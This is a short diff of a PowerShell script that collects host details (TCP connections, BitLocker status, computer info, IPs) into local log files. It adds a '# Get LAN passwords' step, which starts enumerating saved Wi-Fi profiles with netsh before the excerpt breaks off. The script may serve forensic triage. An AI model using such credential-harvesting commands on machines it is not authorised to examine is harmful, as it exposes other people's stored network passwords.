@@ -15,15 +15,13 @@ if (Test-Path "D:\") {
     New-Item -Path "$cwd\$hn" -ItemType "directory"
 }
     
-
 # Get netlogs
 Get-NetTCPConnection | Out-File -FilePath $logs_path\netlogs.txt
 Get-BitLockerVolume | Out-File -FilePath $logs_path\drives_info.txt
 Get-ComputerInfo | Out-File -FilePath $logs_path\comp_info.txt
 Get-NetIPAddress | Out-File -FilePath $logs_path\ips.txt
 
-# Got these lines from: https://chrishales.wordpress.com/2018/01/03/powershell-password-one-liners/
-
+# Get LAN passwords
 (netsh wlan show profiles) `
     | Select-String "\:(.+)$" `
     | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} `
